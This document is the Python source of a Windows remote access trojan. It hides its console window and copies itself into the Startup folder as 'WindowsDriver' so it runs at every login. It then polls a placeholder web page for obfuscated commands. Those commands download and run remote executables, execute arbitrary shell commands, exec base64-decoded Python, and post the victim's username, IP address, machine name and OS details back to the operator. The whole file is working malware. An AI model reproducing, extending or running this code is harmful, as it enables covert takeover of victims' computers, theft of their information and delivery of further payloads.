url_edit = "https://_WEBSITE_HERE_/edit-post/1"
url_raw = "https://_WEBSITE_HERE_/posts/1"
url_ip = "https://api.ipify.org"

import requests
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import time
import random
import base64
import getpass
import ctypes
import shutil
import sys
import platform
import win32gui, win32con

# no consol
ctypes.windll.kernel32.FreeConsole()

# seting up directorys

ffname = os.path.basename(__file__)
user = getpass.getuser()
path = f'''C:/Users/{user}/AppData/Local/Temp/chrome_drag85O92'''
try:
    os.mkdir(path)
except:
    pass


# auto run
THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
my_file = os.path.join(THIS_FOLDER, ffname)
my_file2 = os.path.join(THIS_FOLDER)


lis_ext = list(ffname.split("."))
ext = lis_ext[1]

startup = ("C:" + "/Users/" + str(user) + f"/{ffname}")
startup2 = ("C:" + "/Users/" + str(user) + f"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsDriver.{ext}")

try:
    shutil.move(my_file, startup)           # del that to stop auto run
    rr = os.rename(startup, startup2)
except:
    pass

path_User = f'''C:/Users/{user}/'''

# checking if an other RATata is already in auto-run
if "AppData" in THIS_FOLDER:
    if not "WindowsDriver" in ffname:
        path_User = str(path_User) + str(ffname)
        shutil.move(my_file, path_User)
        exit()

# rat begin
verion_server = "1.2"
version_client = "1.3"
version_API = "1.1"

result = "None"

my_IP = urlopen(Request(url_ip)).read().decode().strip()

# main loop
while True:
    data = urlopen(Request(url_raw)).read().decode()

    
    if result not in data:

        if "P1Ng" in data:
            ip = urlopen(Request(url_ip)).read().decode().strip()
            user = getpass.getuser()
            oss = platform.system()

            result = f"{data}\n    {oss}    [{ip}]   {user}      {version_client}"
            json =   {
                "Title": "",
                "Content": result,
            }
            requests.post(url_edit, data=json)


        if "d0wNL04D" in data:
            if my_IP in data:

                res = data.split(",")  # format: "d0wNL04D", {ip}, {exe}, {link}
                b = 0
                for link in res:
                    b += 1
                    if b == 3:
                        ext = link
                    else:
                        pass
                    if b == 4:
                        mlw = requests.get(link, allow_redirects=True)
                    else:
                        pass

                user = getpass.getuser()

                f_total = (f"{path}/{ext}")

                try:
                    open(f_total, 'wb').write(mlw.content)
                except:
                    path = f'''C:/Users/{user}/'''
                    f_total = (f"{path}/{ext}")
                    open(f_total, 'wb').write(mlw.content)
                os.startfile(f_total)

                json = {
                    "Title": "",
                    "Content": "d0wNL04D3D",
                }
                requests.post(url_edit, data=json)

        if "Ex3c" in data:  # format: "Ex3c"{ip}{cmd},{cmd}
            if my_IP in data:
                cmd = data.replace(my_IP, "")
                cmd = cmd.replace("Ex3c", "")
                lis = list(cmd.split(","))
                for cmdd in lis:
                    os.system(cmdd)
                json = {
                    "Title": "",
                    "Content": "Ex3cUt3D",
                }
                requests.post(url_edit, data=json)

        if "1J3cTe" in data:
            if my_IP in data:
                data = data.replace(my_IP, "")
                data = data.replace("1J3cTe", "")
                lis = list(data.split(","))

                for script in lis:
                    base64_bytes = script.encode('ascii')
                    message_bytes = base64.b64decode(base64_bytes)
                    ready = message_bytes.decode('ascii')
                    exec(ready)
                
                json = {
                    "Title": "",
                    "Content": "1J3cTe3D",
                }
                requests.post(url_edit, data=json)

        if "pC1F0" in data:
            if my_IP in data:
                pc_name = os.environ['COMPUTERNAME']
                oss = platform.system()
                ver = platform.platform()
                info = f"""
    {my_IP} INFORMATION
    -------------------------------------------------------------------
    Username:      {user} 
    Ip:            {my_IP}
    PC name:       {pc_name}
    OS:            {oss}
    OS Version:    {ver}
    RAT Path:      {THIS_FOLDER}
    RAT Name:      {ffname}
    RAT Version:   {version_client}
    -------------------------------------------------------------------"""
                json = {
                    "Title": "",
                    "Content": f"pC1F0G00D{info}",
                }
                requests.post(url_edit, data=json)



        if "KILL" in data:
            exit()


    time.sleep(2)

    


